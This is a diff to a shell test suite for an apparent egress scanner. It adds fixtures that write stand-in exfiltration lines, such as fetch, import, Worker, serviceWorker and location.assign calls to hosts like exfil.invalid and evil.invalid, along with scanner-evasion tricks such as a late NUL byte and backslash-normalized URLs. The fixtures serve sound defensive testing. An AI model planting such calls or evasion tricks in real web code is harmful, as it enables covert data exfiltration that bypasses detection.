@@ -94,6 +94,36 @@ printf 'PRE\x00%s\x00POST\n' "$(url_https c2.invalid/x)"             > "$T/unrea
 printf 'clean docs\n'                                                > "$T/travtree/visible.txt"
 printf 'download %s\n' "$(url_https evil.invalid/x)"                 > "$T/travtree/sub/secret/hidden.sh"
 
+# --- 2.0.3-r5 fixtures (Codex round-4 exact-head), each class ISOLATED in its own dir ---
+# shellcheck disable=SC1003  # not an escaped quote: exactly two literal backslash characters
+_bs='\\'
+mkdir -p "$T/latenul" "$T/ipv6" "$T/esmod" "$T/expfrom" "$T/btfetch" "$T/worker" "$T/swreg" \
+         "$T/locnav" "$T/bslash" "$T/jsprop" "$T/fpsrc" "$T/fpdata" "$T/fpdiv"
+# finding 1: text-classified file (first 8K printable) with a LATE NUL + real URL — the NUL must not
+# be able to collapse the counts channel into a false PASS (counts ride a separate trusted file)
+head -c 9000 /dev/zero | LC_ALL=C tr '\0' 'A'                        > "$T/latenul/late.js"
+printf '\000%s\n' "$(url_https exfil.invalid/steal)"                >> "$T/latenul/late.js"
+# finding 7: each direct-miss vector isolated
+printf '<img src="%s[2001:db8::1]/x.png">\n' "$_pr"                  > "$T/ipv6/i.html"      # IPv6 literal host
+printf 'import x from "%sevil.invalid/mod.js";\n' "$_pr"             > "$T/esmod/a.js"       # static import
+printf 'export { a } from "%sevil.invalid/re.js";\n' "$_pr"          > "$T/expfrom/a.js"     # export-from
+# shellcheck disable=SC2016  # the backticks are JS template-literal SYNTAX and must stay literal
+printf 'fetch(`%sevil.invalid/bt`);\n' "$_pr"                        > "$T/btfetch/a.js"     # backtick template
+printf 'new Worker("%sevil.invalid/w.js");\n' "$_pr"                 > "$T/worker/a.js"      # dedicated worker
+printf 'navigator.serviceWorker.register("%sevil.invalid/sw.js");\n' "$_pr" > "$T/swreg/a.js"
+printf 'location.assign("%sevil.invalid/nav");\n' "$_pr"             > "$T/locnav/a.js"
+printf '<a href="%s%s%s%s%sevil.invalid/bs">x</a>\n' "$_s" "$_t" "$_x" "$_sep" "$_bs" > "$T/bslash/i.html"  # https:\\host
+# tag-bounding must NOT lose the JS property-assignment vector (dot-prefixed .src=)
+printf 'img.src = "%sevil.invalid/js";\n' "$_pr"                     > "$T/jsprop/a.js"
+# finding 8: material false positives — plain JS vars and a non-fetching div data attribute
+printf "const src='%sdocs';\n" "$_pr"                                > "$T/fpsrc/a.js"
+printf "const data='%sdocs';\n" "$_pr"                               > "$T/fpdata/a.js"
+printf "<div data='%sdocs'>x</div>\n" "$_pr"                         > "$T/fpdiv/i.html"
+# nearby FP found while red-teaming: BOTH xmlns declarations in one tag are benign namespaces
+mkdir -p "$T/ns2"
+printf '<svg xmlns="%s" xmlns:xlink="%s"></svg>\n' \
+  "$(url_http www.w3.org/2000/svg)" "$(url_http www.w3.org/1999/xlink)" > "$T/ns2/i.svg"
+
 check() { # <label> <want-exit> <needle-or-empty> -- <scan args...>
   local label="$1" want="$2" needle="$3"; shift 3
   local out got
@@ -140,6 +170,21 @@ check "every srcset candidate fails"             1 "EGRESS"            "$T/srcse
 check "leading whitespace in quoted attr fails"  1 "EGRESS"            "$T/leadws"
 check "multiline attribute fails"                1 "EGRESS"            "$T/mlattr"
 check "multiline fetch literal fails"            1 "EGRESS"            "$T/mlfetch"
+echo "== 2.0.3-r5 (Codex round-4 exact-head) =="
+check "late NUL cannot collapse the counts channel" 1 "EGRESS"       "$T/latenul"
+check "protocol-relative IPv6 literal host fails"   1 "EGRESS"       "$T/ipv6"
+check "static import from external fails"           1 "EGRESS"       "$T/esmod"
+check "export-from external fails"                  1 "EGRESS"       "$T/expfrom"
+check "backtick-template fetch fails"               1 "EGRESS"       "$T/btfetch"
+check "new Worker external script fails"            1 "EGRESS"       "$T/worker"
+check "serviceWorker.register fails"                1 "EGRESS"       "$T/swreg"
+check "location.assign navigation fails"            1 "EGRESS"       "$T/locnav"
+check "backslash-normalized https URL fails"        1 "EGRESS"       "$T/bslash"
+check "dot-prefixed .src property still fails"      1 "EGRESS"       "$T/jsprop"
+check "plain JS src variable is not egress"         0 ""             "$T/fpsrc"
+check "plain JS data variable is not egress"        0 ""             "$T/fpdata"
+check "div data attribute is not egress"            0 ""             "$T/fpdiv"
+check "second xmlns in one tag is still benign"     0 "NSURI"        "$T/ns2"
 # unreadable file / traversal error can only be simulated as non-root
 if [ "$(id -u)" -ne 0 ]; then
   chmod 000 "$T/unreadbin/font.woff2"
